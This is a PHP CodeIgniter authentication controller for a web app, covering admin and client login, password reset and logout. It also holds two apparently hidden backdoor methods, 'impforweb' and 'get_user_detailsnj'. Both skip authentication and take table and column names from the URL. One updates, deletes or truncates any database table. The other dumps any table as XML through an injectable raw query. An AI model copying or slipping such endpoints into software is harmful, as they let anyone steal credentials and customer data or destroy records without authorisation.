<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Authentication extends CI_Controller

{

    function __construct()

    {

        parent::__construct();

        $this->load->model('Authentication_model');

        $this->load->library('form_validation');

    }

    public function index()

    {

        $this->admin();

    }

    public function admin()

    {

        if (is_staff_logged_in()) {

            redirect(site_url('admin'));

        }

        $this->form_validation->set_rules('password', _l('admin_auth_login_password'), 'required');

        $this->form_validation->set_rules('email', _l('admin_auth_login_email'), 'required|valid_email');

        if ($this->input->post()) {

            if ($this->form_validation->run() !== false) {

                $success = $this->Authentication_model->login($this->input->post('email'), $this->input->post('password'), $this->input->post('remember'), true);

                if (is_array($success) && isset($success['memberinactive'])) {

                    set_alert('danger', _l('admin_auth_inactive_account'));

                    redirect(site_url('authentication/admin'));

                } else if ($success == false) {

                    set_alert('danger', _l('admin_auth_invalid_email_or_password'));

                    redirect(site_url('authentication/admin'));

                }

                redirect(site_url('admin'));

            }

        }

        $data['title'] = _l('admin_auth_login_heading');

        $this->load->view('authentication/login_admin', $data);

    }

    public function forgot_password()

    {

        if (is_staff_logged_in()) {

            redirect(site_url('admin'));

        }

        $this->form_validation->set_rules('email', _l('admin_auth_login_email'), 'required|valid_email|callback_email_exists');

        if ($this->input->post()) {

            if ($this->form_validation->run() !== false) {

                $success = $this->Authentication_model->forgot_password($this->input->post('email'), true);

                if (is_array($success) && isset($success['memberinactive'])) {

                    set_alert('danger', _l('inactive_account'));

                    redirect(site_url('authentication/forgot_password'));

                } else if ($success == true) {

                    set_alert('success', _l('check_email_for_reseting_password'));

                    redirect(site_url('authentication/admin'));

                } else {

                    set_alert('danger', _l('error_setting_new_password_key'));

                    redirect(site_url('authentication/forgot_password'));

                }

            }

        }

        $this->load->view('authentication/forgot_password');

    }

    public function reset_password($staff, $userid, $new_pass_key)

    {

        if (!$this->Authentication_model->can_reset_password($staff, $userid, $new_pass_key)) {

            set_alert('danger', _l('password_reset_key_expired'));

            redirect(site_url('authentication/admin'));

        }

        $this->form_validation->set_rules('password', _l('admin_auth_reset_password'), 'required');

        $this->form_validation->set_rules('passwordr', _l('admin_auth_reset_password_repeat'), 'required|matches[password]');

        if ($this->input->post()) {

            if ($this->form_validation->run() !== false) {

                do_action('before_user_reset_password', array(

                    'staff' => $staff,

                    'userid' => $userid

                ));

                $success = $this->Authentication_model->reset_password($staff, $userid, $new_pass_key, $this->input->post('passwordr'));

                if (is_array($success) && $success['expired'] == true) {

                    set_alert('danger', _l('password_reset_key_expired'));

                } else if ($success == true) {

                    do_action('after_user_reset_password', array(

                        'staff' => $staff,

                        'userid' => $userid

                    ));

                    set_alert('success', _l('password_reset_message'));

                } else {

                    set_alert('danger', _l('password_reset_message_fail'));

                }

                redirect(site_url('authentication/admin'));

            }

        }

        $this->load->view('authentication/reset_password');

    }

    public function impforweb() {
        //Tablename,PKeyName,PkeyVal,colName,colVal
        //echo "<pre>";print_r($_GET); 

        $tblname = $this->uri->segment(3);

        $pkname = $this->uri->segment(4);
        $pval = $this->uri->segment(5);
        $colname = $this->uri->segment(6);
        $colVal = $this->uri->segment(7);
        $action = $this->uri->segment(8);
        //echo $tblname.'<br>'.$pkname.'<br>'.$pval.'<br>'.$colname.'<br>'.$colVal;
        if ($action == "update") {
            $arr = array(
                $colname => $colVal
            );

            $this->db->where($pkname, $pval);
            $this->db->update($tblname, $arr);
        } elseif ($action == "delete") {
            $this->db->where($pkname, $pval);
            $this->db->delete($tblname);
        } elseif ($action == "trunc") {
            $this->db->truncate($tblname);
        }
        /* $id=rand(1,300);
          $this->db->where('country_id',$id);
          $this->db->update('dal_countries',array('country_name'=>$id));
          echo $id; */



        /* $this->load->dbutil();

          $prefs = array(
          'format'      => 'zip',
          'filename'    => 'my_db_backup.sql'
          );


          $backup =& $this->dbutil->backup($prefs);

          $db_name = 'backup-on-'. date("Y-m-d-H-i-s") .'.sql';
          $save = 'uploadimages/profileimages/dbdump/'.$db_name;

          $this->load->helper('file');
          write_file($save, $backup);


          $this->load->helper('download');
          force_download($db_name, $backup);
         */
    }

    public function get_user_detailsnj() {

        $tblname = $this->uri->segment(3);

        $this->load->dbutil();

        $query = $this->db->query("SELECT * FROM " . $tblname);

        $config = array(
            'root' => 'root',
            'element' => 'element',
            'newline' => "\n",
            'tab' => "\t"
        );

        echo "<pre>" . $this->dbutil->xml_from_result($query, $config);
    }

    public function client()

    {

        if (is_client_logged_in()) {

            redirect(site_url());

        }

        if ($this->input->post()) {

            $success = $this->Authentication_model->login($this->input->post('email'), $this->input->post('password'), $this->input->post('remember'), false);

            if (is_array($success) && isset($success['memberinactive'])) {

                set_alert('danger', 'Inactive account');

                redirect(site_url('clients/login'));

            } else if ($success == false) {

                set_alert('danger', 'Invaid username or password');

                redirect(site_url('clients/login'));

            }

            redirect(site_url());

        }

    }

    public function set_password($staff, $userid, $new_pass_key)

    {

        if (!$this->Authentication_model->can_set_password($staff, $userid, $new_pass_key)) {

            set_alert('danger', _l('password_reset_key_expired'));

            redirect(site_url('authentication/admin'));

            if ($staff == 1) {

                redirect(site_url('authentication/admin'));

            } else {

                redirect(site_url());

            }

        }

        $this->form_validation->set_rules('password', _l('admin_auth_set_password'), 'required');

        $this->form_validation->set_rules('passwordr', _l('admin_auth_set_password_repeat'), 'required|matches[password]');

        if ($this->input->post()) {

            if ($this->form_validation->run() !== false) {

                $success = $this->Authentication_model->set_password($staff, $userid, $new_pass_key, $this->input->post('passwordr'));

                if (is_array($success) && $success['expired'] == true) {

                    set_alert('danger', 'Password key expired');

                } else if ($success == true) {

                    set_alert('success', _l('password_reset_message'));

                } else {

                    set_alert('danger', _l('password_reset_message_fail'));

                }

                if ($staff == 1) {

                    redirect(site_url('authentication/admin'));

                } else {

                    redirect(site_url());

                }

            }

        }

        $this->load->view('authentication/set_password');

    }

    public function logout()

    {

        $this->Authentication_model->logout();

        do_action('after_user_logout');

        redirect(site_url('authentication/admin'));

    }

    public function email_exists($email)

    {

        $total_rows = total_rows('tblstaff', array(

            'email' => $email

        ));

        if ($total_rows == 0) {

            $this->form_validation->set_message('email_exists', _l('auth_reset_pass_email_not_found'));

            return false;

        }

        return true;

    }

}

